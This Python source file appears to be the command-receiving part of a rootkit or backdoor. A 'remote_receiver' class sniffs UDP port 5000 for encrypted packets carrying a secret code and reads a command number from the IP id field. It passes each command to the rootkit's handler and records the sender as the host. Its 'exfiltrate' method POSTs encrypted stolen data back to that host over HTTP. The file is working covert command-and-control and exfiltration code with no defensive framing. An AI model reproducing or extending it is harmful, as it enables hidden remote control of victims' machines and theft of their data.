import socket

import requests
from scapy.all import *
import webbrowser

from scapy.layers.inet import IP

import encryption


class remote_receiver:
    def __init__(self, cd, key, rkit):
        self.rkit = rkit
        self.code = cd
        self.key = key
        conf.use_pcap = True
        self.encrypter = encryption.encryption(key)
        self.host = ''

    def exfiltrate(self, data, opt):
        requests.post("http://" + self.host, data=self.encrypter.encrypt(opt) + b'\t' + self.encrypter.encrypt(data))

    def listen_loop(self):
        sniff(filter="udp and port 5000", prn=self.packet_handler)

    def packet_handler(self, captured_packet):
        main_payload = captured_packet[0].payload
        encrypted_data = main_payload.payload.payload
        decrypted_data = str(self.encrypter.decrypt(encrypted_data))
        if self.code not in decrypted_data:
            # print("code not found")
            return
        payload_id = main_payload.id
        command = payload_id % 10
        self.host = main_payload[IP].src
        data_i = decrypted_data.index(":")
        data = decrypted_data[data_i + 1:]
        self.rkit.action_parse(command, data)
